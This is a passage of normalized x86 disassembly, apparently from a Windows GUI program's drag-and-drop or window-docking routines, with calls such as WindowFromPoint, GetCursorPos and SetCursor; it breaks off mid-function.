mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_450ee8
sub_446208
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4460f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e0c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_429098
mov edx eax
mov eax esi
call sub_423f88
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_44626c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_44629c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446114
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4462f8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_40348c
pop edi
pop esi
pop ebp
retn 0x4
sub_44631c
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_446340
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44631c
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44631c
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4463fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_446468
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_4468b8
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4459d4
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_44f2dc
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_44f2dc
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44f2dc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_40348c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_4463fc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_44f2dc
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_44f2dc
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_446600
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_44f2dc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44f2dc
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_446644
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_445e5c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_446468
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_418310
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_44f2dc
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_446600
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_40348c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44de0c
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_445dcc
sub_4467a0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41836c
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_418200
mov edx edi
mov eax [ rw-data ]
call sub_4181b4
jmp r-xdata
sub_446800
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_446858
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_4459a0
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_4468b8
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_446858
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4468e4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_446644
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_4468b8
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_446800
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_44f2dc
mov [ esi ] eax
sub_446934
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_446800
cmp eax 0x1
sbb eax eax
inc eax
sub_446970
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_44dd78
test eax eax
je r-xdata
mov eax esi
call sub_44dd78
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_4473a0
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_418310
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41836c
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_44dd8c
mov edi eax
jmp r-xdata
sub_446a04
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_4468e4
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_450dbc
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_446934
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_446934
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_448638
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_446934
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46657c
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_450da4
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_446970
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_40348c
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_450ea4
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_450dbc
jmp r-xdata
mov eax [ rw-data ]
call sub_450f18
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46657c
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_448638
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_40348c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_40348c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407df0
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_446cd4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_445f00
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_450dbc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_446a04
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_446e44
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push j_sub_403758#9
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_40348c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_40348c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_446208
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_446cd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4460f0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_44f2dc
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416cac
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44860c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_416cac
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_447008
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_40348c
mov ebx eax
sub_44707c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_447348
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_4472d6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_445f48
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403440
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_447008
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_446934
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_450f18
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4472dd
mov eax [ rw-data ]
call sub_403290
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_45f870
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_449ca8
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_446800
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
